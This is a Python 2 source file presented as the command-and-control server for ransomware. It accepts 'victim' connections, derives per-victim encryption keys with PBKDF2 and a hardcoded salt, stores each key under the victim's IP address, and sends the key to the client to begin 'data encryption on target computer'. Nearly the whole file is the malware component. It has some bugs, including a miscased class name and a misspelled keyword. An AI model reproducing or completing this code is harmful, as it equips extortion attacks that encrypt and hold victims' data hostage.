#  Ransom server or the command and control server that has to be run on the hackers computer 
#  will keep record of the all the victims with their ip's who executed the MALWARE with their respective private keys and passwords . 
#! usr/bin/python 
import os 
import sys 
import socket 
import thread 
import base64 

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from cryptography.fernet import Fernet


# function modules to be utilised ....///
# key generation function as the client runs the malware

def generate_key(passw , name):

	# all the components of the PBkdF2HMAC Operation :::../

	password = passw.encode()
	salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c' 
	# kdf ---> key derivation function :: to secure the priv_key 

	kdf = PBkdF2HMAC(

			algorihm = hashes.SHA256(),
			length = 32 , 
			salt = salt,
			iterations = 10000, 
			backend = default_backend()

		)

	key = base64.urlsafe_b64encode(kdf.derive(password))


	file = open(name+".key" , "wb")
	file.write(key)

	file.close()
	return key 


# multi client handler command -->> control server 
def  clienthandler_server(clientSocket , addr):

	while 1:
		    # reciving the victim--> clinet data through the TCP SOCKET 
			client_data  = clientSocket.recv(2048)
			if client_data :

						print client_data

						clientSocket.send(client_data)

						password = Fernet.generate_key()
						print "Current Client's PBkdF2HMAC password is: " + password
						# passing fernet generated password into the kdf function 
					    # secret var contains the finally generated 
					    #  AES based private key 

						secret = generate_key(password, addr[0])
						print "Secret(AES) private key of the client is : " + secret
						# sending the key to encrypt the all data as malware runs 

						clientSocket.send(secret)
						
						print clientSocket.recv(2048)
						print "Data encryption started on target computer..."
						clientSocket.close()
						break

			else :
						clientSocket.close()
						return

#  Binding the server to the universal ip address and port to handle the 
  #    client---->> Victim's connections 

hackerserver = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

hackerserver.bind((sys.argv[1] , int(sys.argv[2])))
# client handling capacity of the server 
hackerserver.listen(5)

while 1:

		csocket,addr = hackerserver.accept()
		# start the thread as the new client connect as the service 
		print "New Victim trapped ;;)) \n"

		print "socket recived %s: %s" %(addr)

		thread.start_new_thread(clienthandler_server , (csocket, addr))


#  server code is done .../////::



